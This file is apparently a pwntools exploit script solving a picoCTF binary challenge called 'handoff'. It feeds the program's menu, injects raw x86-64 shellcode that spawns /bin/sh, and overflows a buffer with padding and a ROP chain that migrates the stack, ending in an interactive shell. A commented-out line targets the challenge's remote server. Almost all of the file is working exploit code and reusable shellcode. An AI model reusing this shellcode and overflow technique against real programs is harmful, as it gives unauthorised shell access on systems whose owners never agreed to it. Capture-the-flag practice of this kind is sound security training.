#!/bin/python3
from pwn import *

elf = context.binary = ELF('./handoff', checksec=False)
context.terminal = ['tmux', 'new-window']
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
print(f"ret: {ret}")
rop.migrate(0x404060)
p = process()
gdb.attach(p)
# p = remote('shape-facility.picoctf.net', 52893)
p.clean()
p.sendline(b'1')
p.clean()
p.sendline(b'a')
p.clean()
p.sendline(b'2')
p.clean()
p.sendline(b'0')
p.clean()
p.sendline(b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05')
# p.sendline(b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga')
p.clean()
p.sendline(b'3')
p.clean()
p.sendline(b'a' * 20 + rop.chain())
# p.sendline(b'a' * 20 + p64(0x7fffffffd3b8))
p.interactive()
# 0x1fb38 - stack to sc 
# 0x255d884000 - libc to stack
